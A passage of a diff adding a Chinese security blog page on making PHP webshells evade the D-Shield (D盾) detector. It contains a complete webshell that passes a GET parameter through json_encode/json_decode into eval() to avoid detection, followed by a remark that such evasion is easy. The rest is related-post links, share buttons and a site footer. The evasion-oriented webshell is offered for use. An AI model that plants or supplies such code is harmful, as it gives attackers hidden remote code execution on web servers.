+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>利用json过D盾</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">   class Emp {
+</span></span><span class="line"><span class="cl">       public $a = &#34;&#34;;
+</span></span><span class="line"><span class="cl">   }
+</span></span><span class="line"><span class="cl">   $e = new Emp();
+</span></span><span class="line"><span class="cl">   $e-&gt;a = $_GET;
+</span></span><span class="line"><span class="cl">eval(json_decode(json_encode($e), true)[&#39;a&#39;][&#39;code&#39;]);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>希望通过本文的阅读让大家明白，D盾0级的免杀也没有那么难做。</p>
+<p>套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。</p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/tomcat-memory-webshell-filter/">Tomcat内存Webshell解析之Filter型</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/jsp-classload-backdoor/">[知识星球]JSP类加载后门</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-bypass-jsp/">WebShell免杀之JSP</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-3/">MSF免杀360&#43;火绒上线(三)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/shellcode-bypass-360-2/">MSF免杀360&#43;火绒上线(二)</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-10-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-title="[知识星球]WebShell免杀之PHP" data-hashtags="webshell,免杀"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-hashtag="webshell"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-title="[知识星球]WebShell免杀之PHP"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-title="[知识星球]WebShell免杀之PHP"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-title="[知识星球]WebShell免杀之PHP"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/webshell-bypass-php/" data-title="[知识星球]WebShell免杀之PHP" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;[知识星球]WebShell免杀之PHP&#34;, &#34;https://yzddmr6.com/posts/webshell-bypass-php/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/hack-pubg-cheat-site-2/" class="prev" rel="prev" title="向吃鸡外挂站开炮（二）"><i class="fas fa-angle-left fa-fw"></i>向吃鸡外挂站开炮（二）</a>
+            <a href="/posts/antsword-xor-encoder/" class="next" rel="next" title="蚁剑实现动态秘钥编码器解码器">蚁剑实现动态秘钥编码器解码器<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
